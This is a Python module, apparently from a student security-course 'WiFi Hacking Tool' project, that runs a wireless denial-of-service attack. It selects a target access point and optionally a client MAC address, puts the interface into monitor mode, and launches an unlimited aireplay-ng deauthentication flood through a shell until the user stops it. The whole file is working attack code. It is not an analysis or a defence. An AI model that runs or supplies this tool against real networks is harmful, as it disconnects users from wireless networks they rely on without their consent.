'''
============================================================
                NSSECU2 - Hacking Tool Project
============================================================
        Members: Escalona, Fadrigo, Fortiz, Manzano, Sy
        Topic: WiFi Hacking Tool
        Description: The objective of this project is to 
                     create a packaged tool that will be 
                     able to do Wi-Fi scanning, cracking, 
                     and admin control access.
        Objective Functionalities:
            1. WPA Scanning & Handshake Capture
            2. WPA Cracking
            3. WiFi DOS
            4. Other Tools
            5. Windows Saved WiFi Passwords
            6. Bluetooth Reconnaissance
============================================================

DEAUTHENTICATION MODULE
'''

import interfaces.interfaces as interface
import wifi.scanning.wpascan as wpascan
import utils.utils as utils
import subprocess

def wifi_dos(device):
    utils.header("WiFi DOS/Deauth Attack","Configure WiFi Deauth Parameters")
    
    #Get Target
    target = wpascan.get_target(device)
    if target == None:
        return

    #Target host that is connected to the WiFi network (optional)
    target_host = ""
    invalid_mac = True
    if utils.yesNo("WiFi DOS/Deauth Attack","Configure WiFi Deauth Parameters","Use Host Specific Mode?", False):
        while invalid_mac:
            utils.header("WiFi DOS/Deauth Attack", "Host Specific Mode Configuration")
            target_host = input("Enter MAC address of target device (Format: AA:BB:CC:DD:EE:FF): ").upper()
            if utils.valid_mac(target_host):
                invalid_mac = False
        utils.header("WiFi DOS/Deauth Attack", "Note that configuration is set to Host Specific Mode mode and will target " + target_host.upper() + ".")
    else:
        utils.header("WiFi DOS/Deauth Attack", "Note that this configuration won't be as effective as using Host Specific Mode.")
    utils.getch()

    #Display descriptions
    target_descs = [
                "Death Attack Target",
                "SSID: " + target["essid"],
                "MAC Address: " + target["bssid"],
                "Channel: " + target["channel"],
                "Host Specific Mode: " + str(not(target_host == "")),
                "Target Host: " + target_host
            ]

    #Ask if to begin WiFi DOS Attack
    if utils.yesNo("WiFi DOS/Deauth Attack", target_descs, "Start WiFi DOS/Deauth Attack?", False):        
        #Start monitor
        utils.header("Loading WiFi DOS/Deauth attack...")
        enable = interface.enable_monitor(device, channel=target["channel"])
        device = enable[1]

        #Build deauth command
        utils.header("WiFi DOS/Deauth Attack", "WiFi DOS/Deauth Attack Starting...")
        process_command = deauth_wifi_command(target, device, target_host)

        #Commence process
        process = subprocess.Popen(process_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

        #Wait for process to finish until user presses Enter
        utils.header("WiFi DOS/Deauth Attack", ["WiFi DOS/Deauth Attack Ongoing...","WiFi DOS/Deauth PID: " + str(process.pid)])
        utils.getch("Press Enter to stop WiFi DOS/Deauth Attack...")
        process.kill()

        interface.disable_monitor(device)
    else:
        utils.header("WiFi DOS/Deauth Attack", "WiFi DOS/Deauth Attack Cancelled!")

#Returns deauth WiFi command to be executed.
def deauth_wifi_command(wifi:dict, device, host_macaddress=""):
    wifi_macaddress = wifi["bssid"]
    device_logicalname = interface.get_logicalname(device)
    if host_macaddress == "":
        return "aireplay-ng -0 0 -a " + wifi_macaddress + " " + device_logicalname #w/o host target
    else:
        return "aireplay-ng -0 0 -a " + wifi_macaddress + " -c " + host_macaddress + " " + device_logicalname #w/ host_target